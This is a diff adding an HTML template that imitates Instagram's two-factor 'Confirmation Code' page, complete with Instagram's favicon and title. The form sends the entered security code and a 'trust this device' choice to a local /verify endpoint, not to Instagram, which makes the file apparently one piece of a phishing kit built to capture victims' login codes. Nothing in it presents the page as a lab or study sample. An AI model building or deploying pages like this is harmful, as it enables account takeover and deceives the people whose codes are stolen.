@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="tr-TR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+    <title>Instagram</title>
+    <style>
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        :root {
+            --background-color: #fff;
+            --text-color: #000;
+            --input-background: #f3f0f0;
+            --input-color: #000;
+            --focus-border-color: #000;
+            --button-background: #1994c9;
+            --button-color: #fff;
+            --button-hover: #196b91;
+            --link-color: #1994c9;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+            flex-direction: column;
+            background-color: var(--background-color);
+            color: var(--text-color);
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            border: 1px solid var(--text-color);
+        }
+
+        .image {
+            width: 30%;
+            height: auto;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            margin-bottom: 15px;
+        }
+
+        input[type="text"] {
+            width: 95%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid;
+            border-radius: 4px;
+            background-color: var(--input-background);
+            color: var(--input-color);
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: var(--focus-border-color);
+        }
+
+        button {
+            width: 95%;
+            padding: 10px;
+            background-color: var(--button-background);
+            color: var(--button-color);
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        button:hover {
+            background-color: var(--button-hover);
+        }
+
+        label {
+            display: inline-block;
+            text-align: left;
+            margin-left: 10px;
+            width: 100%;
+            margin-top: 30px;
+        }
+
+        input[type="checkbox"] {
+            margin-right: 5px;
+            margin-left: 0;
+        }
+
+        a {
+            text-decoration: none;
+            color: var(--link-color);
+        }
+
+
+        @media (max-width: 767px) {
+            body {
+                padding-top: 0; 
+            }
+
+            .container {
+                width: 100%;
+                padding: 15px;
+                position: absolute;
+                top: 5%; 
+                left: 50%; 
+                transform: translateX(-50%);
+                border: none;
+            }
+
+            .image {
+                width: 35%;
+            }
+
+            label {
+                display: none;
+            }
+
+            h2 {
+                margin-top: 20px;
+            }
+
+            input[type="text"] {
+                width: 80%;
+            }
+
+            button {
+                width: 80%;
+            }
+        }
+        
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="static/2falight.png" alt="A2FA" class="image">
+        <form id="login-form" action="/verify" method="POST">
+            <h2>Confirmation Code</h2>
+            <input type="text" name="security_code" placeholder="Security Code" id="security-code" required maxlength="6" autocomplete="off">
+            <button type="submit">Confirm</button>
+            <div class="erromsg">
+                {% if result %} <p>{{ result }}</p> {% endif %}
+            </div>
+            <label>
+                <input type="checkbox" name="trust_device"> Trust this device
+            </label>
+            <br><br><br>
+            <p>Didn't get a security code?</p>
+            <a href="#">Send code via SMS instead</a>
+            <br><br><br>
+            <p>If you're unable to receive a security code</p>
+            <p>use one of your backup codes</p>
+        </form>
+    </div>
+</body>
+</html>
